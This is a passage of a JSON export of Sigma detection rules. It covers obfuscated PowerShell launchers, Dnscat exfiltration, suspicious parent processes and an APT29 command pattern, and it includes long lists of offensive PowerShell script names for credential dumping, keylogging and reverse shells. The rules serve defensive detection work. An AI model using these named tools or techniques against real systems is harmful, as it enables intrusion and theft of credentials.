                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of Environment Variables to execute PowerShell\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|re: .*cmd.{0,5}(?:/c|/r)(?:\\s|)\"set\\s[a-zA-Z]{3,6}.*(?:\\{\\d\\}){1,}\\\\\"\\s+?-f(?:.*\\)){1,}.*\"\nfalsepositives:\n- Unknown\nid: 6bfb8fa7-b2e7-4f6c-8d9d-824e5d06ea9e\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 0adfbc14-0ed1-11eb-adc1-0242ac120002\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR+ Launcher - PowerShell Module\n",
                            "sigma:id": "6bfb8fa7-b2e7-4f6c-8d9d-824e5d06ea9e",
                            "title": "Invoke-Obfuscation VAR+ Launcher - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f241cf1b-3a6b-4e1a-b4f9-133c00dd95ca",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via RUNDLL LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via RUNDLL LAUNCHER\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains|all:\n    - rundll32.exe\n    - shell32.dll\n    - shellexec_rundll\n    - powershell\nfalsepositives:\n- Unknown\nid: f241cf1b-3a6b-4e1a-b4f9-133c00dd95ca\nlevel: medium\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 11b52f18-aaec-4d60-9143-5dd8cc4706b9\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation RUNDLL LAUNCHER - Security\n",
                            "sigma:id": "f241cf1b-3a6b-4e1a-b4f9-133c00dd95ca",
                            "title": "Invoke-Obfuscation RUNDLL LAUNCHER - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "36c5146c-d127-4f85-8e21-01bf62355d5a",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Rundll32 in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2019/10/08\ndescription: Detects Obfuscated Powershell via use Rundll32 in Scripts\ndetection:\n  condition: selection\n  selection:\n    CommandLine|re: (?i).*&&.*rundll32.*shell32\\.dll.*shellexec_rundll.*(value|invoke|comspec|iex).*\"\nfalsepositives:\n- Unknown\nid: 36c5146c-d127-4f85-8e21-01bf62355d5a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/Neo23x0/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Rundll32\n",
                            "sigma:id": "36c5146c-d127-4f85-8e21-01bf62355d5a",
                            "title": "Invoke-Obfuscation Via Use Rundll32",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a6d67db4-6220-436d-8afc-f3842fe05d43",
                        "lookup_data": {
                            "description": "Dnscat exfiltration tool execution",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Dnscat exfiltration tool execution\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: Start-Dnscat2\nfalsepositives:\n- \"Legitimate usage of PowerShell Dnscat2 \\u2014 DNS Exfiltration tool (unlikely)\"\nid: a6d67db4-6220-436d-8afc-f3842fe05d43\nlevel: critical\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048\n- attack.execution\n- attack.t1059.001\ntitle: Dnscat Execution\n",
                            "sigma:id": "a6d67db4-6220-436d-8afc-f3842fe05d43",
                            "title": "Dnscat Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "18988e1b-9087-4f8a-82fe-0414dce49878",
                        "lookup_data": {
                            "description": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)",
                            "raw": "author: frack113, Nasreddine Bencherchali\ndate: 2022/08/20\ndescription: Detects code execution via Pester.bat (Pester - Powershell Modulte for\n  testing)\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    ParentCommandLine|contains:\n    - '{ Invoke-Pester -EnableExit ;'\n    - '{ Get-Help \"'\n  selection_module:\n    ParentCommandLine|contains: \\WindowsPowerShell\\Modules\\Pester\\\n    ParentImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Legitimate use of Pester for writing tests for Powershell scripts and modules\nid: 18988e1b-9087-4f8a-82fe-0414dce49878\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/Oddvarmoe/status/993383596244258816\n- https://twitter.com/_st0pp3r_/status/1560072680887525378\nrelated:\n- id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1216\ntitle: Execute Code with Pester.bat as Parent\n",
                            "sigma:id": "18988e1b-9087-4f8a-82fe-0414dce49878",
                            "title": "Execute Code with Pester.bat as Parent",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a16980c2-0c56-4de0-9a79-17971979efdd",
                        "lookup_data": {
                            "description": "Detects Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe.\nThis could be a sign of obfuscation of a fat finger problem (typo by the developer).\n",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/23\ndescription: 'Detects Windows command lines that miss a space before or after the\n  /c flag when running a command using the cmd.exe.\n\n  This could be a sign of obfuscation of a fat finger problem (typo by the developer).\n\n  '\ndetection:\n  condition: 1 of selection* and not 1 of filter*\n  filter1:\n    CommandLine|contains:\n    - 'cmd.exe /c '\n    - 'cmd /c '\n    - 'cmd.exe /k '\n    - 'cmd /k '\n    - 'cmd.exe /r '\n    - 'cmd /r '\n  filter_falsepositives:\n  - CommandLine|contains: AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules\n  - CommandLine|endswith: cmd.exe/c .\n  - CommandLine: cmd.exe /c\n  selection1:\n    CommandLine|contains:\n    - cmd.exe/c\n    - \\cmd/c\n    - '\"cmd/c'\n    - cmd.exe/k\n    - \\cmd/k\n    - '\"cmd/k'\n    - cmd.exe/r\n    - \\cmd/r\n    - '\"cmd/r'\n  selection2:\n    CommandLine|contains:\n    - /cwhoami\n    - /cpowershell\n    - /cschtasks\n    - /cbitsadmin\n    - /ccertutil\n    - /kwhoami\n    - /kpowershell\n    - /kschtasks\n    - /kbitsadmin\n    - /kcertutil\n  selection3:\n    CommandLine|contains:\n    - cmd.exe /c\n    - cmd /c\n    - cmd.exe /k\n    - cmd /k\n    - cmd.exe /r\n    - cmd /r\nfalsepositives:\n- Unknown\nid: a16980c2-0c56-4de0-9a79-17971979efdd\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://twitter.com/cyb3rops/status/1562072617552678912\n- https://ss64.com/nt/cmd.html\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Missing Space Characters in Command Lines\n",
                            "sigma:id": "a16980c2-0c56-4de0-9a79-17971979efdd",
                            "title": "Missing Space Characters in Command Lines",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e9f55347-2928-4c06-88e5-1a7f8169942e",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - '{0}'\n    - '{1}'\n    - '{2}'\n    - '{3}'\n    - '{4}'\n    - '{5}'\n    CommandLine|contains|all:\n    - '&&set'\n    - cmd\n    - /c\n    - -f\nfalsepositives:\n- Unknown\nid: e9f55347-2928-4c06-88e5-1a7f8169942e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/16\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION\n",
                            "sigma:id": "e9f55347-2928-4c06-88e5-1a7f8169942e",
                            "title": "Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8",
                        "lookup_data": {
                            "description": "Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/09/12\ndescription: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM\n  host process) as a parent or child process (sign of an active PowerShell remote\n  session).\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\wsmprovhost.exe\n  - ParentImage|endswith: \\wsmprovhost.exe\nfalsepositives:\n- Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nfields:\n- ComputerName\n- User\n- CommandLine\nid: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1021.006\ntitle: Remote PowerShell Session Host Process (WinRM)\n",
                            "sigma:id": "734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8",
                            "title": "Remote PowerShell Session Host Process (WinRM)",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "402e1e1d-ad59-47b6-bf80-1ee44985b3a7",
                        "lookup_data": {
                            "description": "Detects Commandlet names from ShellIntel exploitation scripts.",
                            "raw": "author: Max Altgelt (Nextron Systems), Tobias Michalski (Nextron Systems)\ndate: 2021/08/09\ndescription: Detects Commandlet names from ShellIntel exploitation scripts.\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - Invoke-SMBAutoBrute\n    - Invoke-GPOLinks\n    - Invoke-Potato\nfalsepositives:\n- Unknown\nid: 402e1e1d-ad59-47b6-bf80-1ee44985b3a7\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/02\nreferences:\n- https://github.com/Shellntel/scripts/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Malicious ShellIntel PowerShell Commandlets\n",
                            "sigma:id": "402e1e1d-ad59-47b6-bf80-1ee44985b3a7",
                            "title": "Malicious ShellIntel PowerShell Commandlets",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "41025fd7-0466-4650-a813-574aaacbe7f4",
                        "lookup_data": {
                            "description": "Detects the execution of known offensive powershell scripts used for exploitation or reconnaissance",
                            "raw": "author: frack113, Nasreddine Bencherchali\ndate: 2023/01/23\ndescription: Detects the execution of known offensive powershell scripts used for\n  exploitation or reconnaissance\ndetection:\n  condition: 1 of selection_*\n  selection_generic:\n    ContextInfo|contains:\n    - Add-ConstrainedDelegationBackdoor.ps1\n    - Add-Exfiltration.ps1\n    - Add-Persistence.ps1\n    - Add-RegBackdoor.ps1\n    - Add-RemoteRegBackdoor.ps1\n    - Add-ScrnSaveBackdoor.ps1\n    - Check-VM.ps1\n    - ConvertTo-ROT13.ps1\n    - Copy-VSS.ps1\n    - Create-MultipleSessions.ps1\n    - DNS_TXT_Pwnage.ps1\n    - Do-Exfiltration.ps1\n    - DomainPasswordSpray.ps1\n    - Download_Execute.ps1\n    - Download-Execute-PS.ps1\n    - Enabled-DuplicateToken.ps1\n    - Enable-DuplicateToken.ps1\n    - Execute-Command-MSSQL.ps1\n    - Execute-DNSTXT-Code.ps1\n    - Execute-OnTime.ps1\n    - ExetoText.ps1\n    - Exploit-Jboss.ps1\n    - Find-AVSignature.ps1\n    - Find-Fruit.ps1\n    - Find-GPOLocation.ps1\n    - Find-TrustedDocuments.ps1\n    - FireBuster.ps1\n    - FireListener.ps1\n    - Get-ApplicationHost.ps1\n    - Get-ChromeDump.ps1\n    - Get-ClipboardContents.ps1\n    - Get-ComputerDetail.ps1\n    - Get-FoxDump.ps1\n    - Get-GPPAutologon.ps1\n    - Get-GPPPassword.ps1\n    - Get-IndexedItem.ps1\n    - Get-Keystrokes.ps1\n    - Get-LSASecret.ps1\n    - Get-MicrophoneAudio.ps1\n    - Get-PassHashes.ps1\n    - Get-PassHints.ps1\n    - Get-RegAlwaysInstallElevated.ps1\n    - Get-RegAutoLogon.ps1\n    - Get-RickAstley.ps1\n    - Get-Screenshot.ps1\n    - Get-SecurityPackages.ps1\n    - Get-ServiceFilePermission.ps1\n    - Get-ServicePermission.ps1\n    - Get-ServiceUnquoted.ps1\n    - Get-SiteListPassword.ps1\n    - Get-System.ps1\n    - Get-TimedScreenshot.ps1\n    - Get-UnattendedInstallFile.ps1\n    - Get-Unconstrained.ps1\n    - Get-USBKeystrokes.ps1\n    - Get-VaultCredential.ps1\n    - Get-VulnAutoRun.ps1\n    - Get-VulnSchTask.ps1\n    - Get-WebConfig.ps1\n    - Get-WebCredentials.ps1\n    - Get-WLAN-Keys.ps1\n    - Gupt-Backdoor.ps1\n    - HTTP-Backdoor.ps1\n    - HTTP-Login.ps1\n    - Install-ServiceBinary.ps1\n    - Install-SSP.ps1\n    - Invoke-ACLScanner.ps1\n    - Invoke-ADSBackdoor.ps1\n    - Invoke-AmsiBypass.ps1\n    - Invoke-ARPScan.ps1\n    - Invoke-BackdoorLNK.ps1\n    - Invoke-BadPotato.ps1\n    - Invoke-BetterSafetyKatz.ps1\n    - Invoke-BruteForce.ps1\n    - Invoke-BypassUAC.ps1\n    - Invoke-Carbuncle.ps1\n    - Invoke-Certify.ps1\n    - Invoke-ConPtyShell.ps1\n    - Invoke-CredentialInjection.ps1\n    - Invoke-CredentialsPhish.ps1\n    - Invoke-DAFT.ps1\n    - Invoke-DCSync.ps1\n    - Invoke-Decode.ps1\n    - Invoke-DinvokeKatz.ps1\n    - Invoke-DllInjection.ps1\n    - Invoke-DowngradeAccount.ps1\n    - Invoke-EgressCheck.ps1\n    - Invoke-Encode.ps1\n    - Invoke-EventViewer.ps1\n    - Invoke-Eyewitness.ps1\n    - Invoke-FakeLogonScreen.ps1\n    - Invoke-Farmer.ps1\n    - Invoke-Get-RBCD-Threaded.ps1\n    - Invoke-Gopher.ps1\n    - Invoke-Grouper2.ps1\n    - Invoke-Grouper3.ps1\n    - Invoke-HandleKatz.ps1\n    - Invoke-Interceptor.ps1\n    - Invoke-Internalmonologue.ps1\n    - Invoke-Inveigh.ps1\n    - Invoke-InveighRelay.ps1\n    - Invoke-JSRatRegsvr.ps1\n    - Invoke-JSRatRundll.ps1\n    - Invoke-KrbRelay.ps1\n    - Invoke-KrbRelayUp.ps1\n    - Invoke-LdapSignCheck.ps1\n    - Invoke-Lockless.ps1\n    - Invoke-MalSCCM.ps1\n    - Invoke-Mimikatz.ps1\n    - Invoke-MimikatzWDigestDowngrade.ps1\n    - Invoke-Mimikittenz.ps1\n    - Invoke-MITM6.ps1\n    - Invoke-NanoDump.ps1\n    - Invoke-NetRipper.ps1\n    - Invoke-NetworkRelay.ps1\n    - Invoke-NinjaCopy.ps1\n    - Invoke-OxidResolver.ps1\n    - Invoke-P0wnedshell.ps1\n    - Invoke-P0wnedshellx86.ps1\n    - Invoke-Paranoia.ps1\n    - Invoke-PortScan.ps1\n    - Invoke-PoshRatHttp.ps1\n    - Invoke-PoshRatHttps.ps1\n    - Invoke-PostExfil.ps1\n    - Invoke-PowerDump.ps1\n    - Invoke-PowerShellIcmp.ps1\n    - Invoke-PowerShellTCP.ps1\n    - Invoke-PowerShellTcpOneLine.ps1\n    - Invoke-PowerShellTcpOneLineBind.ps1\n    - Invoke-PowerShellUdp.ps1\n    - Invoke-PowerShellUdpOneLine.ps1\n    - Invoke-PowerShellWMI.ps1\n    - Invoke-PowerThIEf.ps1\n    - Invoke-PPLDump.ps1\n    - Invoke-Prasadhak.ps1\n    - Invoke-PsExec.ps1\n    - Invoke-PsGcat.ps1\n    - Invoke-PsGcatAgent.ps1\n    - Invoke-PSInject.ps1\n    - Invoke-PsUaCme.ps1\n    - Invoke-ReflectivePEInjection.ps1\n    - Invoke-ReverseDNSLookup.ps1\n    - Invoke-Rubeus.ps1\n    - Invoke-RunAs.ps1\n    - Invoke-SafetyKatz.ps1\n    - Invoke-SauronEye.ps1\n    - Invoke-SCShell.ps1\n    - Invoke-Seatbelt.ps1\n    - Invoke-ServiceAbuse.ps1\n    - Invoke-SessionGopher.ps1\n    - Invoke-ShellCode.ps1\n    - Invoke-SMBScanner.ps1\n    - Invoke-Snaffler.ps1\n    - Invoke-Spoolsample.ps1\n    - Invoke-SSHCommand.ps1\n    - Invoke-SSIDExfil.ps1\n    - Invoke-StandIn.ps1\n    - Invoke-StickyNotesExtract.ps1\n    - Invoke-Tater.ps1\n    - Invoke-Thunderfox.ps1\n    - Invoke-ThunderStruck.ps1\n    - Invoke-TokenManipulation.ps1\n    - Invoke-Tokenvator.ps1\n    - Invoke-TotalExec.ps1\n    - Invoke-UrbanBishop.ps1\n    - Invoke-UserHunter.ps1\n    - Invoke-VoiceTroll.ps1\n    - Invoke-Whisker.ps1\n    - Invoke-WinEnum.ps1\n    - Invoke-winPEAS.ps1\n    - Invoke-WireTap.ps1\n    - Invoke-WmiCommand.ps1\n    - Invoke-WScriptBypassUAC.ps1\n    - Invoke-Zerologon.ps1\n    - Keylogger.ps1\n    - MailRaider.ps1\n    - New-HoneyHash.ps1\n    - OfficeMemScraper.ps1\n    - Offline_Winpwn.ps1\n    - Out-CHM.ps1\n    - Out-DnsTxt.ps1\n    - Out-Excel.ps1\n    - Out-HTA.ps1\n    - Out-Java.ps1\n    - Out-JS.ps1\n    - Out-Minidump.ps1\n    - Out-RundllCommand.ps1\n    - Out-SCF.ps1\n    - Out-SCT.ps1\n    - Out-Shortcut.ps1\n    - Out-WebQuery.ps1\n    - Out-Word.ps1\n    - Parse_Keys.ps1\n    - Port-Scan.ps1\n    - PowerBreach.ps1\n    - powercat.ps1\n    - PowerRunAsSystem.psm1\n    - PowerSharpPack.ps1\n    - PowerUp.ps1\n    - PowerUpSQL.ps1\n    - PowerView.ps1\n    - PSAsyncShell.ps1\n    - RemoteHashRetrieval.ps1\n    - Remove-Persistence.ps1\n    - Remove-PoshRat.ps1\n    - Remove-Update.ps1\n    - Run-EXEonRemote.ps1\n    - Schtasks-Backdoor.ps1\n    - Set-DCShadowPermissions.ps1\n    - Set-MacAttribute.ps1\n    - Set-RemotePSRemoting.ps1\n    - Set-RemoteWMI.ps1\n    - Set-Wallpaper.ps1\n    - Show-TargetScreen.ps1\n    - Speak.ps1\n    - Start-CaptureServer.ps1\n    - Start-WebcamRecorder.ps1\n    - StringToBase64.ps1\n    - TexttoExe.ps1\n    - VolumeShadowCopyTools.ps1\n    - WinPwn.ps1\n    - WSUSpendu.ps1\n  selection_invoke_sharp:\n    ContextInfo|contains|all:\n    - Invoke-Sharp\n    - .ps1\nfalsepositives:\n- Unknown\nid: 41025fd7-0466-4650-a813-574aaacbe7f4\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/PowerShellMafia/PowerSploit\n- https://github.com/NetSPI/PowerUpSQL\n- https://github.com/CsEnox/EventViewer-UACBypass\n- https://github.com/AlsidOfficial/WSUSpendu/\n- https://github.com/nettitude/Invoke-PowerThIEf\n- https://github.com/S3cur3Th1sSh1t/WinPwn\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: f331aa1f-8c53-4fc3-b083-cc159bc971cb\n  type: similar\n- id: bf7286e7-c0be-460b-a7e8-5b2e07ecc2f2\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Malicious PowerShell Scripts - PoshModule\n",
                            "sigma:id": "41025fd7-0466-4650-a813-574aaacbe7f4",
                            "title": "Malicious PowerShell Scripts - PoshModule",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "754ed792-634f-40ae-b3bc-e0448d33f695",
                        "lookup_data": {
                            "description": "Detects a suspicious or uncommon parent processes of PowerShell",
                            "raw": "author: Teymur Kheirkhabarov, Harish Segar (rule)\ndate: 2020/03/20\ndescription: Detects a suspicious or uncommon parent processes of PowerShell\ndetection:\n  condition: all of selection_*\n  selection_parent:\n  - ParentImage|endswith:\n    - \\mshta.exe\n    - \\rundll32.exe\n    - \\regsvr32.exe\n    - \\services.exe\n    - \\winword.exe\n    - \\powerpnt.exe\n    - \\excel.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\visio.exe\n    - \\outlook.exe\n    - \\amigo.exe\n    - \\chrome.exe\n    - \\firefox.exe\n    - \\iexplore.exe\n    - \\microsoftedgecp.exe\n    - \\microsoftedge.exe\n    - \\browser.exe\n    - \\vivaldi.exe\n    - \\safari.exe\n    - \\sqlagent.exe\n    - \\sqlserver.exe\n    - \\sqlservr.exe\n    - \\w3wp.exe\n    - \\httpd.exe\n    - \\nginx.exe\n    - \\php-cgi.exe\n    - \\jbosssvc.exe\n    - \\MicrosoftEdgeSH.exe\n  - ParentImage|contains: tomcat\n  selection_powershell:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - CommandLine|contains:\n    - /c powershell\n    - /c pwsh\n  - Description: Windows PowerShell\n  - Product: PowerShell Core 6\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Other scripts\nid: 754ed792-634f-40ae-b3bc-e0448d33f695\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=26\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Parent Process\n",
                            "sigma:id": "754ed792-634f-40ae-b3bc-e0448d33f695",
                            "title": "Suspicious PowerShell Parent Process",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "033fe7d6-66d1-4240-ac6b-28908009c71f",
                        "lookup_data": {
                            "description": "This method detects a suspicious PowerShell command line combination as used by APT29 in a campaign against U.S. think tanks.",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/12/04\ndescription: This method detects a suspicious PowerShell command line combination\n  as used by APT29 in a campaign against U.S. think tanks.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - -noni\n    - -ep\n    - bypass\n    - $\nfalsepositives:\n- Unknown\nid: 033fe7d6-66d1-4240-ac6b-28908009c71f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/\n- https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\nstatus: test\ntags:\n- attack.execution\n- attack.g0016\n- attack.t1059.001\ntitle: APT29\n",
                            "sigma:id": "033fe7d6-66d1-4240-ac6b-28908009c71f",
                            "title": "APT29",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df",
                        "lookup_data": {
                            "description": "Detects changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up.",
                            "raw": "author: faloker\ndate: 2020/02/12\ndescription: Detects changes to the EC2 instance startup script. The shell script\n  will be executed as root/SYSTEM every time the specific instances are booted up.\ndetection:\n  condition: selection_source\n  selection_source:\n    eventName: ModifyInstanceAttribute\n    eventSource: ec2.amazonaws.com\n    requestParameters.attribute: userData\nfalsepositives:\n- Valid changes to the startup script\nid: 1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df\nlevel: high\nlogsource:\n  product: aws\n  service: cloudtrail\nmodified: 2022/06/07\nreferences:\n- https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/ec2__startup_shell_script/main.py#L9\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.004\ntitle: AWS EC2 Startup Shell Script Change\n",
                            "sigma:id": "1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df",
                            "title": "AWS EC2 Startup Shell Script Change",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f331aa1f-8c53-4fc3-b083-cc159bc971cb",
                        "lookup_data": {
                            "description": "Detects the creation of known offensive powershell scripts used for exploitation",
                            "raw": "author: Markus Neis, Nasreddine Bencherchali (Nextron Systems), Mustafa Kaan Demir,\n  Georg Lauenstein\ndate: 2018/04/07\ndescription: Detects the creation of known offensive powershell scripts used for exploitation\ndetection:\n  condition: 1 of selection_*\n  selection_generic:\n    TargetFilename|endswith:\n    - \\Add-ConstrainedDelegationBackdoor.ps1\n    - \\Add-Exfiltration.ps1\n    - \\Add-Persistence.ps1\n    - \\Add-RegBackdoor.ps1\n    - \\Add-RemoteRegBackdoor.ps1\n    - \\Add-ScrnSaveBackdoor.ps1\n    - \\Check-VM.ps1\n    - \\ConvertTo-ROT13.ps1\n    - \\Copy-VSS.ps1\n    - \\Create-MultipleSessions.ps1\n    - \\DNS_TXT_Pwnage.ps1\n    - \\Do-Exfiltration.ps1\n    - \\DomainPasswordSpray.ps1\n    - \\Download_Execute.ps1\n    - \\Download-Execute-PS.ps1\n    - \\Enabled-DuplicateToken.ps1\n    - \\Enable-DuplicateToken.ps1\n    - \\Execute-Command-MSSQL.ps1\n    - \\Execute-DNSTXT-Code.ps1\n    - \\Execute-OnTime.ps1\n    - \\ExetoText.ps1\n    - \\Exploit-Jboss.ps1\n    - \\Find-AVSignature.ps1\n    - \\Find-Fruit.ps1\n    - \\Find-GPOLocation.ps1\n    - \\Find-TrustedDocuments.ps1\n    - \\FireBuster.ps1\n    - \\FireListener.ps1\n    - \\Get-ApplicationHost.ps1\n    - \\Get-ChromeDump.ps1\n    - \\Get-ClipboardContents.ps1\n    - \\Get-ComputerDetail.ps1\n    - \\Get-FoxDump.ps1\n    - \\Get-GPPAutologon.ps1\n    - \\Get-GPPPassword.ps1\n    - \\Get-IndexedItem.ps1\n    - \\Get-Keystrokes.ps1\n    - \\Get-LSASecret.ps1\n    - \\Get-MicrophoneAudio.ps1\n    - \\Get-PassHashes.ps1\n    - \\Get-PassHints.ps1\n    - \\Get-RegAlwaysInstallElevated.ps1\n    - \\Get-RegAutoLogon.ps1\n    - \\Get-RickAstley.ps1\n    - \\Get-Screenshot.ps1\n    - \\Get-SecurityPackages.ps1\n    - \\Get-ServiceFilePermission.ps1\n    - \\Get-ServicePermission.ps1\n    - \\Get-ServiceUnquoted.ps1\n    - \\Get-SiteListPassword.ps1\n    - \\Get-System.ps1\n    - \\Get-TimedScreenshot.ps1\n    - \\Get-UnattendedInstallFile.ps1\n    - \\Get-Unconstrained.ps1\n    - \\Get-USBKeystrokes.ps1\n    - \\Get-VaultCredential.ps1\n    - \\Get-VulnAutoRun.ps1\n    - \\Get-VulnSchTask.ps1\n    - \\Get-WebConfig.ps1\n    - \\Get-WebCredentials.ps1\n    - \\Get-WLAN-Keys.ps1\n    - \\Gupt-Backdoor.ps1\n    - \\HTTP-Backdoor.ps1\n    - \\HTTP-Login.ps1\n    - \\Install-ServiceBinary.ps1\n    - \\Install-SSP.ps1\n    - \\Invoke-ACLScanner.ps1\n    - \\Invoke-ADSBackdoor.ps1\n    - \\Invoke-AmsiBypass.ps1\n    - \\Invoke-ARPScan.ps1\n    - \\Invoke-BackdoorLNK.ps1\n    - \\Invoke-BadPotato.ps1\n    - \\Invoke-BetterSafetyKatz.ps1\n    - \\Invoke-BruteForce.ps1\n    - 